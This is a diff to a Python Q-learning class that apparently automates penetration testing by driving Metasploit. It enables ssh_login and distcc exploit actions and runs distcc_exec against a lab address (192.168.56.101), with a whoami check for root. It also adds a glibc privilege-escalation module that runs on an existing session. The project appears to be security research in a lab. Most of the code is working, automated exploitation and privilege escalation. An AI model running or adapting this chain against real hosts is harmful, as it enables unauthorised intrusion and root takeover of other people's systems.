@@ -72,18 +72,18 @@ class QLearningTable:
             self.action_in_the_right_shell= True
             
             
-        print console_data['data']
+        #print console_data['data']
         
     def initialise_all_actions(self):
         # retourne un dictionnaire { str(action): action}
         return {
-                #str(self.ssh_login): self.ssh_login,
-                str(self.samba): self.samba,
+                str(self.ssh_login): self.ssh_login,
+                #str(self.samba): self.samba,
                 str(self.ftp1): self.ftp1,
                 str(self.mysql): self.mysql,
                 str(self.dirtyCow): self.dirtyCow,
                 #str(self.ls): self.ls,
-                #str(self.distcc): self.distcc,
+                str(self.distcc): self.distcc,
                 str(self.postgresql): self.postgresql
                 }
 
@@ -341,30 +341,35 @@ class QLearningTable:
     def distcc(self):
         RPORT='3632'
         
-        if self.nmap_dict[RPORT]=='open': #on vérifie que le port visé est bien ouvert
-            self.console.execute('use exploit/unix/misc/distcc_exec')
-            time.sleep(10)
-            c=self.action_in_the_right_shell
-            
-            if c:
-                self.console.execute('set RHOSTS 192.168.56.101')
-                time.sleep(3)
-                self.console.execute('exploit')
-                time.sleep(15)
-                a=self.success
+        try:
+            if self.nmap_dict[RPORT]=='open': #on vérifie que le port visé est bien ouvert
+                self.console.execute('use exploit/unix/misc/distcc_exec')
+                time.sleep(10)
+                c=self.action_in_the_right_shell
                 
-                if a:
-                    self.console.execute('whoami')
-                    time.sleep(4)
+                if c:
+                    self.console.execute('set RHOSTS 192.168.56.101')
+                    time.sleep(3)
+                    self.console.execute('exploit')
+                    time.sleep(15)
+                    a=self.success
+                    
+                    if a:
+                        self.console.execute('whoami')
+                        time.sleep(4)
+                    
+                    b= self.whoami
                 
-                b= self.whoami
+                    return a, b
+                
+                else:
+                    return False, 'Not root'
             
-                return a, b
-            
-            else:
-                return False, 'Not root'
+            return False, 'Not root'
         
-        return False, 'Not root'
+        except BaseException:
+            print('An error was raised !')
+            return False, 'Not root'
         
     def postgresql(self):
         RPORT='5432'
@@ -424,6 +429,36 @@ class QLearningTable:
         else:
             return False, 'Not root'
         
+    def glibc_origin_expansion_priv_esc(self):
+        if self.session >0:
+            self.background()
+            self.console.execute('use linux/local/glibc_origin_expansion_priv_esc')
+            time.sleep(4)
+            self.console.execute('set session ' + self.session)
+            time.sleep(4)
+            self.console.execute('run')
+            time.sleep(20)
+            
+            a= self.success
+                
+            if a:
+                #VERIFIER SI C'EST BIEN COMME CELA QUE FONCTIONNE L'EXPLOIT, C'EST A DIRE S'IL CREE UNE NOUVELLE SESSION ET PUIS IL FAUT SE CONNECTER A CETTE SESSION
+                self.console.execute('sessions -i ' + str(self.session))
+                time.sleep(4)
+                self.console.execute('whoami')
+                time.sleep(4)
+            
+            b= self.whoami
+        
+            #while self.global_console_status:
+            #while console.console.read()['busy']:
+            #time.sleep(2)
+            return a, b
+            
+        else:
+            return False, 'Not root'
+        
+    
     def ls(self):
         self.console.execute('ls')
         time.sleep(3)
